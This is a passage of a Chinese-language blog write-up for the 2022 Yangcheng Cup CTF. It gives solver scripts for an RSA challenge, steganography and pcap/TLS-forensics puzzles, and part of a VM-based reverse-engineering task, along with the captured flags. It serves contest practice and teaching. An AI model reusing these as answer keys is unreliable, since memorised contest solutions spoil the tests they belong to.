<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">B=<span class="number">1023</span></span><br><span class="line">PPQ=<span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ=<span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t=<span class="number">44</span></span><br><span class="line">c=<span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">PQ = gmpy2.gcd(PPQ,PQQ)</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">p = <span class="number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205</span>+<span class="number">58</span></span><br><span class="line">q = <span class="number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407</span>+<span class="number">44</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q)))</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3>
<p>直接ciphey识别解码就OK</p>
<p>![14](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\14.png)</p>
<h3 id="where_is_secret"><a class="markdownIt-Anchor" href="#where_is_secret"></a> where_is_secret</h3>
<p>拿到附件，vig.txt的内容一眼丁真，vigenere编码（<a href="https://www.guballa.de/vigenere-solver%EF%BC%89%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8B%BF%E5%88%B0%E8%A7%A3%E5%BC%80%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%BE%97%E5%88%B0%E4%B8%80%E5%BC%A0bmp%E5%9B%BE%E7%89%87%EF%BC%8C%E7%BB%93%E5%90%88hint%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%86%99%E8%AF%BB%E5%83%8F%E7%B4%A0%E7%82%B9%E8%84%9A%E6%9C%AC">https://www.guballa.de/vigenere-solver）在线解密，拿到解开压缩包得到一张bmp图片，结合hint的脚本，写读像素点脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>)</span><br><span class="line">    imgdata = np.array(img)</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">            m = <span class="built_in">int</span>(imgdata[x][y][<span class="number">1</span>])</span><br><span class="line">            n = <span class="built_in">int</span>(imgdata[x][y][<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">str</span> = m&lt;&lt;<span class="number">8</span></span><br><span class="line">            <span class="built_in">str</span> += n</span><br><span class="line">            file.write(<span class="built_in">chr</span>(<span class="built_in">str</span>))</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decode()</span><br></pre></td></tr></table></figure>
<p>打开输出的文本，发现flag被打散在文本中，写一个字母识别脚本,懒了，没写正则。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=<span class="string">&#x27;D:\\桌面\\829962.txt&#x27;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;3&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">var = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        var += i</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>
<p>获得串flag</p>
<p>![15](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\15.png)</p>
<p>结合特征</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h3 id="迷失幻境"><a class="markdownIt-Anchor" href="#迷失幻境"></a> 迷失幻境</h3>
<p>打卡压缩包，是虚拟磁盘镜像，取证大师挂载，查看回收站有一个jpg和一个45文件。</p>
<p>![16](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\16.png)</p>
<p>查看45文件发现PNG格式特征</p>
<p>![17](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\17.png)</p>
<p>补充文件头，然后与给的100张图片中随便选一张用stegslove里的Image combiner，获得一窜字符“Key is 可莉前来报到”，猜测可爱可莉.jpg就是加密的图片，轮番试过之后，用outguess解出flag</p>
<p>![18](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\18.png)</p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h3 id="躲猫猫"><a class="markdownIt-Anchor" href="#躲猫猫"></a> 躲猫猫</h3>
<p>打开题目附件，用wireshark打开，读取http报文，发现一个PNG特征格式的文件</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\19.png)</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\20.png)</p>
<p>下载获得一张灰色的PNG</p>
<p>接着读报文，FTP拿到一个加密压缩包，发现key.log没有加密，查看内容，通过查询是用来解密TLS流量的。</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\21.png)</p>
<p>解密TLS流量之后获得一张JPG图片</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\22.png)</p>
<p>内容是压缩包的解压密码。解压后的脚本是对原图的像素重计算，编写脚本恢复原图。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">image = cv2.imread(<span class="string">&quot;hide.png&quot;</span>)</span><br><span class="line">imagearray = array(image)</span><br><span class="line"> </span><br><span class="line">x,y = <span class="number">5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span>,<span class="number">6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span></span><br><span class="line"> </span><br><span class="line">h,w = <span class="number">1800</span>,<span class="number">1800</span></span><br><span class="line"> </span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1*<span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2*<span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3*<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到一张图片，一番搜索，是Maxicode码，扫描多次未成功，接着查找资料，发现猫的位置需要更替为一个中心靶标（公牛眼）</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\23.png)</p>
<p>扫描成功！！</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\24.png)</p>
<p>GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2>
<h3 id="bbbbutton"><a class="markdownIt-Anchor" href="#bbbbutton"></a> BBBButton</h3>
<p>输入分为两段，其中第二段是最后的flag。因为只有4个按钮，猜测与四进制有关，之后在动调的过程中也刚好发现了四进制转换后的数字。</p>
<h4 id="check1"><a class="markdownIt-Anchor" href="#check1"></a> <strong>check1</strong></h4>
<p>动调发现，check1是从一张表中得到&quot;-bl^H&quot;字符串，本质上是通过整除及取余的方式确定下标得到字符。脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> table <span class="keyword">import</span> table        <span class="comment"># 导入表</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>]</span><br><span class="line">a1 = [<span class="number">0x2d</span>,<span class="number">0x62</span>]    <span class="comment"># 14772//4</span></span><br><span class="line">a2 = [<span class="number">0x6c</span>,<span class="number">0x5e</span>]    <span class="comment"># 24740//4</span></span><br><span class="line">a3 = <span class="number">0x48</span></span><br><span class="line"><span class="comment"># 4,344,684,1024,1364,1704,2044,2384,2724,3064,3404,3744,4084,4424,4764,5104,5444,5784,6124,6464,6804,7144,7484,7824,8164,8504,8844,9184,9524,9864,10204,10544,10884,11224,11564,11904,12244,12584,12924,13264,13604,13944,14284,14624,14964,15304,15644,15984,16324,16664,17004,17344,17684,18024,18364,18704,19044,19384,19724,20064,20404,20744,21084,21424,21764,22104,22444,22784,23124,23464,23804,24144,24484,24824,25164,25504,25844,26184,26524,26864,27204,27544,27884,28224,28564</span></span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(table),<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i]==a3:</span><br><span class="line">        tt.append(i//<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># print(i,end=&#x27;,&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a1[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a1[<span class="number">1</span>]:</span><br><span class="line">        n = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;1:&#x27;,i)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a2[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a2[<span class="number">1</span>]:</span><br><span class="line">        m = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;2:&#x27;,i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = n*<span class="number">0x1c39</span>+m</span><br><span class="line"><span class="comment"># k = 0x1973a6e</span></span><br><span class="line"><span class="comment"># print(hex(k))</span></span><br><span class="line"></span><br><span class="line">m = k%<span class="number">0x1c39</span></span><br><span class="line">b = k//<span class="number">0x1c39</span></span><br><span class="line"><span class="comment"># print(hex(m))</span></span><br><span class="line"><span class="comment"># print(hex(table[4*m]),hex(table[4*m+1]),hex(table[4*m+2]),hex(table[4*m+3]))</span></span><br><span class="line"><span class="comment"># print(chr(table[4*m+1]),chr(table[4*m]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">    a = i+<span class="number">85</span>*k</span><br><span class="line">    <span class="comment"># b,c = aaa(a,0x55)</span></span><br><span class="line">    c = a//<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> c==k:</span><br><span class="line">        flag1 = a</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="comment"># 0x87366687</span></span><br></pre></td></tr></table></figure>
<p>将解出的a转化为4进制输入即可（动调按按钮真的魔鬼，不小心按错还得重头再来）</p>
<h4 id="check2"><a class="markdownIt-Anchor" href="#check2"></a> <strong>check2</strong></h4>
<p>vm混淆，opcode利用check1加密过，动调直接dump即可。然后就是喜闻乐见的手撕环节（悲</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span 